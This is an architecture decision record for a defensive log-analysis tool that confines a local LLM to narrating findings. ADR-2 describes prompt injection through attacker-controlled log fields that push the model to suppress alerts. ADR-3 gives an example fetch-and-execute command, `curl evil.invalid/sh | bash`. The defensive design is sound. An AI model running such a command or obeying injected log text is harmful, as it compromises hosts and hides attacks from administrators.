# Sloth SOC: Architecture Decision Records (ADRs)

This file tracks architectural decisions, deviations from initial assumptions, and why they were made.

## ADR-1: IP-day as the fundamental unit of analysis
- **Context:** Server logs can contain hundreds of thousands of lines per day. Analyzing raw events individually overloads the LLM and misses slow, distributed attacks.
- **Decision:** Aggregate multi-scale features into a single row per `(src_ip, utc_day)`.
- **Consequences:** Low-and-slow scanners are captured in 24-hour totals while bursts are captured via 5-minute sliding windows. Fast processing; compact feature vectors.

## ADR-2: Code decides, the LLM only narrates
- **Context:** Threat model analysis shows log fields (usernames, user agents, paths) are attacker-controlled. Prompt injection can instruct models to suppress alerts or hallucinate clean statuses.
- **Decision:** Deterministic rules, statistics, and machine learning assign severity, status, entities, and recommended actions. The LLM receives a structured brief containing only derived facts and enums, and its output is strictly validated against a JSON schema.
- **Consequences:** Eliminates LLM authority hijacking. Hallucinations are detectable and rejectable via deterministic grounding validation.

## ADR-3: Enumerated actions over free-form command generation
- **Context:** An injected prompt might trick an LLM into recommending dangerous bash commands (e.g., `curl evil.invalid/sh | bash`).
- **Decision:** The model selects an action from a fixed `ActionEnum` (`CONFIRM_LEGIT_LOGIN`, `ROTATE_CREDENTIALS`, etc.) that maps to reviewed, safe human advice. The model cannot author shell commands.
- **Consequences:** Safe by construction. Zero possibility of malicious command suggestion.

## ADR-4: Hybrid detection architecture
- **Context:** Neither pure rules nor pure ML solve security detection alone. Rules have false negatives on novel patterns; unsupervised ML has high false discovery rates; few-shot supervised ML requires labels.
- **Decision:** Use an ensemble of deterministic rules (R1-R8), statistical tail tests with Benjamini-Hochberg FDR control (`stat`), unsupervised anomaly detection (`IsolationForest`), and optional supervised models (`TabPFN` / `RandomForest`). Rules take priority for critical alerts; ML surfaces subtle anomalies.
- **Consequences:** High recall on known attacks with statistical safety against false discovery flooding.

## ADR-5: Zero external database dependencies (SQLite & flat files)
- **Context:** Setup friction is the enemy of adoption for home-labs and small teams.
- **Decision:** Nightly batch processing reads directly from log files (or `.gz`), stores baselines in local SQLite, and outputs static HTML/Markdown digests.
- **Consequences:** Zero external database servers to manage, secure, or patch.

## ADR-6: Strict loopback-only LLM host enforcement
- **Context:** Accidental configuration of cloud endpoints or remote hosts would compromise user log privacy.
- **Decision:** Enforce that `llm.host` strictly points to loopback (`127.0.0.1`, `localhost`, `::1`) in `config.py` unless `allow_remote: true` is explicitly configured.
- **Consequences:** Impossible to inadvertently leak log summaries to external cloud endpoints.

## ADR-7: Synthetic-first evaluation protocol
- **Context:** Real logs cannot be committed to public repositories due to privacy, yet benchmark claims must be 100% reproducible.
- **Decision:** Build a synthetic generator with labelled scenarios (B1-B6, M1-M7) using RFC-reserved IP addresses (`198.51.100.0/24`, `203.0.113.0/24`, `2001:db8::/32`) and `.invalid` domains. Test distribution shift with dedicated shift seeds.
- **Consequences:** Safe, ethical, completely reproducible evaluation without leaking private data.

## ADR-8: Prioritizing faithfulness over latency ("Slow and Steady")
- **Context:** The Hacktoberfest Week 3 theme is "Slow and Steady". The administrator is asleep when the tool runs overnight.
- **Decision:** Prefer careful, multi-stage detection, thorough schema validation, and larger local models (e.g. Gemma 4B) over sub-second latency.
- **Consequences:** Deep inspection and rock-solid defense within an acceptable overnight budget (< 90 seconds).
